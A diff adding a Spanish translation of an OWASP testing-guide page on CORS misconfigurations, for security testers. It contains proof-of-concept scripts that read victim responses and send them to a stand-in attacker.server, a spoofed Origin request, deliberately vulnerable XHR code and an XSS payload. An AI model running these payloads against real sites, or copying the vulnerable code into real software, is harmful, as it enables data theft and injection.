@@ -1,0 +1,183 @@
+<h1 id="cross-origin-resource-sharing">Cross Origin Resource Sharing (CORS)</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-CLNT-07</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p><a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing" target="_blank" rel="noopener">Cross Origin Resource Sharing</a> (CORS) es un mecanismo que permite a un navegador web realizar peticiones entre dominios (cross-domain) de manera controlada utilizando la API XMLHttpRequest (XHR) Nivel 2 (L2). En el pasado, la API XHR L1 solo permitía enviar peticiones dentro del mismo origen, ya que estaba restringida por la <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy" target="_blank" rel="noopener">Same Origin Policy</a> (SOP).</p>
+<p>Las peticiones de origen cruzado (cross-origin) tienen una cabecera <code>Origin</code> que identifica el dominio que inicia la petición y que siempre se envía al servidor. CORS define el protocolo que se debe usar entre un navegador web y un servidor para determinar si se permite una petición de origen cruzado. Para ello se utilizan <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers" target="_blank" rel="noopener">cabeceras</a> HTTP.</p>
+<p>El <a href="https://fetch.spec.whatwg.org/#http-cors-protocol" target="_blank" rel="noopener">WHATWG Fetch Living Standard (CORS Protocol)</a> (que sustituye a la especificación CORS del W3C, ya retirada) establece que, para las peticiones no simples, como las que usan métodos distintos de GET o POST o las que utilizan credenciales, se debe enviar de antemano una petición OPTIONS previa (pre-flight) para comprobar si el tipo de petición tendrá un impacto negativo sobre los datos. La petición previa verifica los métodos y cabeceras permitidos por el servidor, y si se permiten credenciales. Según el resultado de la petición OPTIONS, el navegador decide si la petición está permitida o no.</p>
+<h3 id="origin--access-control-allow-origin">Origin y Access-Control-Allow-Origin</h3>
+<p>La cabecera de petición <code>Origin</code> siempre es enviada por el navegador en una petición CORS e indica el origen de la petición. La cabecera Origin no puede modificarse desde JavaScript, ya que <a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_request_header" target="_blank" rel="noopener">el navegador (el user-agent) bloquea su modificación</a>; sin embargo, apoyarse en esta cabecera para las comprobaciones de control de acceso no es una buena idea, porque puede falsificarse fuera del navegador, por ejemplo mediante un proxy, por lo que aún es necesario comprobar que se utilizan protocolos a nivel de aplicación para proteger los datos sensibles.</p>
+<p><code>Access-Control-Allow-Origin</code> es una cabecera de respuesta que utiliza un servidor para indicar qué dominios pueden leer la respuesta. Según la especificación CORS, corresponde al cliente determinar y hacer cumplir la restricción de si tiene acceso a los datos de la respuesta con base en esta cabecera.</p>
+<p>Desde la perspectiva de las pruebas de seguridad, se deben buscar configuraciones inseguras, como por ejemplo usar un comodín <code>*</code> como valor de la cabecera <code>Access-Control-Allow-Origin</code>, lo que significa que se permiten todos los dominios. Otro ejemplo inseguro es cuando el servidor devuelve la cabecera origin sin ninguna comprobación adicional, lo que puede conducir al acceso a datos sensibles. Esta configuración que permite peticiones de origen cruzado es muy insegura y no es aceptable en términos generales, excepto en el caso de una API pública destinada a ser accesible por todos.</p>
+<h3 id="access-control-request-method--access-control-allow-method">Access-Control-Request-Method y Access-Control-Allow-Method</h3>
+<p>La cabecera <code>Access-Control-Request-Method</code> se utiliza cuando un navegador realiza una petición OPTIONS previa y permite al cliente indicar el método de la petición final. Por otro lado, <code>Access-Control-Allow-Method</code> es una cabecera de respuesta que utiliza el servidor para describir los métodos que los clientes pueden usar.</p>
+<h3 id="access-control-request-headers--access-control-allow-headers">Access-Control-Request-Headers y Access-Control-Allow-Headers</h3>
+<p>Estas dos cabeceras se utilizan entre el navegador y el servidor para determinar qué cabeceras se pueden usar para realizar una petición de origen cruzado.</p>
+<h3 id="access-control-allow-credentials">Access-Control-Allow-Credentials</h3>
+<p>Esta cabecera de respuesta permite a los navegadores leer la respuesta cuando se pasan credenciales. Cuando se envía la cabecera, la aplicación web debe establecer un origen como valor de la cabecera <code>Access-Control-Allow-Origin</code>. La cabecera <code>Access-Control-Allow-Credentials</code> no puede utilizarse junto con la cabecera <code>Access-Control-Allow-Origin</code> cuyo valor sea el comodín <code>*</code>, como en el siguiente caso:</p>
+<pre><code class="language-http">Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+</code></pre>
+<h3 id="input-validation">Validación de entrada</h3>
+<p>XHR L2 introduce la posibilidad de crear una petición entre dominios utilizando la API XHR por compatibilidad con versiones anteriores. Esto puede introducir vulnerabilidades de seguridad que no estaban presentes en XHR L1. Puntos interesantes del código para explotar serían las URLs que se pasan a XMLHttpRequest sin validación, especialmente si se permiten URLs absolutas, porque eso podría conducir a inyección de código. Del mismo modo, otra parte de la aplicación que puede explotarse es aquella en la que los datos de la respuesta no se escapan y podemos controlarlos proporcionando entrada del usuario.</p>
+<h3 id="other-headers">Otras cabeceras</h3>
+<p>Hay otras cabeceras involucradas, como <code>Access-Control-Max-Age</code>, que determina el tiempo durante el cual una petición previa puede almacenarse en caché en el navegador, o <code>Access-Control-Expose-Headers</code>, que indica qué cabeceras es seguro exponer a la API de una especificación de API CORS.</p>
+<p>Para revisar las cabeceras CORS, consulte el <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#The_HTTP_response_headers" target="_blank" rel="noopener">documento CORS de MDN</a>.</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar los endpoints que implementan CORS.</li>
+<li>Asegurar que la configuración de CORS sea segura o inofensiva.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<p>Una herramienta como <a href="https://www.zaproxy.org" target="_blank" rel="noopener">ZAP</a> puede permitir a los evaluadores interceptar cabeceras HTTP, lo que puede revelar cómo se utiliza CORS. Los evaluadores deben prestar especial atención a la cabecera origin para saber qué dominios están permitidos. Además, en algunos casos es necesaria la inspección manual del JavaScript para determinar si el código es vulnerable a la inyección de código debido a un manejo inadecuado de la entrada proporcionada por el usuario.</p>
+<h3 id="cors-misconfiguration">Configuración errónea de CORS</h3>
+<p>Establecer el comodín en la cabecera <code>Access-Control-Allow-Origin</code> (es decir, <code>Access-Control-Allow-Origin: *</code>) no es seguro si la respuesta contiene información sensible. Aunque no puede usarse al mismo tiempo con <code>Access-Control-Allow-Credentials: true</code>, puede ser peligroso cuando el control de acceso se realiza únicamente mediante reglas de firewall o las direcciones IP de origen, en lugar de estar protegido por credenciales.</p>
+<h4 id="wildcard-access-control-allow-origin">Access-Control-Allow-Origin con comodín</h4>
+<p>Un evaluador puede comprobar si <code>Access-Control-Allow-Origin: *</code> existe en los mensajes de respuesta HTTP.</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+[...]
+Access-Control-Allow-Origin: *
+Content-Length: 4
+Content-Type: application/xml
+
+[Response Body]
+</code></pre>
+<p>Si una respuesta contiene datos sensibles, un atacante puede robarlos mediante el uso de XHR:</p>
+<pre><code class="language-html">&lt;html&gt;
+    &lt;head&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (this.readyState == 4 &amp;&amp; this.status == 200) {
+                    var xhr2 = new XMLHttpRequest();
+                    // attacker.server: attacker listener to steal response
+                    xhr2.open(&quot;POST&quot;, &quot;https://attacker.server&quot;, true);
+                    xhr2.send(xhr.responseText);
+                }
+            };
+            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
+            xhr.open(&quot;GET&quot;, &quot;https://victim.site&quot;, true);
+            xhr.send();
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h4 id="dynamic-cors-policy">Política CORS dinámica</h4>
+<p>Una aplicación web o API moderna puede estar implementada para permitir peticiones de origen cruzado de forma dinámica, generalmente para permitir las peticiones provenientes de subdominios, como en el siguiente caso:</p>
+<pre><code class="language-php">if (preg_match(&#39;|\.example.com$|&#39;, $_SERVER[&#39;SERVER_NAME&#39;])) {
+   header(&quot;Access-Control-Allow-Origin: {$_SERVER[&#39;HTTP_ORIGIN&#39;]}&quot;);
+   ...
+}
+</code></pre>
+<p>En este ejemplo, se permitirán todas las peticiones de los subdominios de example.com. Hay que asegurarse de que la expresión regular utilizada para la coincidencia sea completa. De lo contrario, si simplemente se comparara con <code>example.com</code> (sin añadir <code>$</code>), los atacantes podrían eludir la política CORS añadiendo su dominio a la cabecera <code>Origin</code>.</p>
+<pre><code class="language-http">GET /test.php HTTP/1.1
+Host: example.com
+[...]
+Origin: https://example.com.attacker.com
+Cookie: &lt;session cookie&gt;
+</code></pre>
+<p>Cuando se envía la petición anterior, si se devuelve la siguiente respuesta con <code>Access-Control-Allow-Origin</code> cuyo valor es el mismo que la entrada del atacante, este puede leer la respuesta posteriormente y acceder a información sensible que solo es accesible para un usuario víctima.</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+[...]
+Access-Control-Allow-Origin: https://example.com.attacker.com
+Access-Control-Allow-Credentials: true
+Content-Length: 4
+Content-Type: application/xml
+
+[Response Body]
+</code></pre>
+<h4 id="allowlisted-null-origin-value">Valor de origen null en la lista de permitidos</h4>
+<p>La cabecera <code>Origin</code> puede tener el valor <code>null</code> en situaciones específicas, como las peticiones desencadenadas desde un archivo local, una redirección o un objeto serializado. A veces los desarrolladores incluyen el origen <code>null</code> en la lista de permitidos para facilitar el desarrollo local o para dar soporte a clientes que no son web.</p>
+<p>Sin embargo, el origen <code>null</code> actúa como un &quot;comodín&quot; que puede explotarse. Un atacante puede generar programáticamente una petición con el origen <code>null</code> mediante un <code>iframe</code> en modo sandbox.</p>
+<p>Si el servidor simplemente refleja el origen <code>null</code> en las cabeceras de respuesta, especialmente con credenciales permitidas, se crea una vulnerabilidad similar a la del comodín genérico.</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+[...]
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+Content-Length: 4
+Content-Type: application/xml
+</code></pre>
+<p>En un escenario de explotación, un atacante incrusta un <code>iframe</code> con sandbox en su sitio malicioso. El atributo <code>sandbox</code> obliga al navegador a establecer el <code>Origin</code> de las peticiones iniciadas desde dentro de ese frame como <code>null</code>.</p>
+<pre><code class="language-html">&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&quot;data:text/html,
+    &lt;script&gt;
+        fetch(&#39;https://victim.site/sensitive-data&#39;, {
+            method: &#39;GET&#39;,
+            credentials: &#39;include&#39; // Essential for sending cookies/auth headers
+        })
+        .then(response =&gt; response.text())
+        .then(data =&gt; {
+            // Exfiltrate data to attacker&#39;s server
+            location.href = &#39;https://attacker.server/log?data=&#39; + btoa(data);
+        });
+    &lt;/script&gt;&quot;&gt;
+&lt;/iframe&gt;
+</code></pre>
+<p>En consecuencia, el navegador ve que la petición proviene de <code>null</code>, el servidor permite <code>null</code> y el atacante lee con éxito la respuesta sensible.</p>
+<h3 id="input-validation-weakness">Debilidad en la validación de entrada</h3>
+<p>El concepto de CORS puede verse desde un ángulo completamente distinto. Un atacante puede permitir su política CORS a propósito para inyectar código en la aplicación web objetivo.</p>
+<h4 id="remote-xss-with-cors">XSS remoto con CORS</h4>
+<p>Este código realiza una petición al recurso pasado después del carácter <code>#</code> en la URL, utilizado inicialmente para obtener recursos en el mismo servidor.</p>
+<p>Código vulnerable:</p>
+<pre><code class="language-html">&lt;script&gt;
+    var req = new XMLHttpRequest();
+
+    req.onreadystatechange = function() {
+        if(req.readyState==4 &amp;&amp; req.status==200) {
+            document.getElementById(&quot;div1&quot;).innerHTML=req.responseText;
+        }
+    }
+
+    var resource = location.hash.substring(1);
+    req.open(&quot;GET&quot;,resource,true);
+    req.send();
+&lt;/script&gt;
+
+&lt;body&gt;
+    &lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;
+&lt;/body&gt;
+</code></pre>
+<p>Por ejemplo, una petición como esta mostrará el contenido del archivo <code>profile.php</code>:</p>
+<p><code>https://example.foo/main.php#profile.php</code></p>
+<p>Petición y respuesta generadas por <code>https://example.foo/profile.php</code>:</p>
+<pre><code class="language-html">GET /profile.php HTTP/1.1
+Host: example.foo
+[...]
+Referer: https://example.foo/main.php
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+[...]
+Content-Length: 25
+Content-Type: text/html
+
+[Response Body]
+</code></pre>
+<p>Ahora, como no hay validación de la URL, podemos inyectar un script remoto, que se inyectará y ejecutará en el contexto del dominio <code>example.foo</code>, con una URL como esta:</p>
+<pre><code class="language-text">https://example.foo/main.php#https://attacker.bar/file.php
+</code></pre>
+<p>Petición y respuesta generadas por <code>https://attacker.bar/file.php</code>:</p>
+<pre><code class="language-html">GET /file.php HTTP/1.1
+Host: attacker.bar
+[...]
+Referer: https://example.foo/main.php
+origin: https://example.foo
+
+HTTP/1.1 200 OK
+[...]
+Access-Control-Allow-Origin: *
+Content-Length: 92
+Content-Type: text/html
+
+Injected Content from attacker.bar &lt;img src=&quot;#&quot; onerror=&quot;alert(&#39;Domain: &#39;+document.domain)&quot;&gt;
+</code></pre>
+<h2 id="references">Referencias</h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" target="_blank" rel="noopener">OWASP HTML5 Security Cheat Sheet</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS" target="_blank" rel="noopener">MDN Cross-Origin Resources Sharing</a></li>
+</ul>
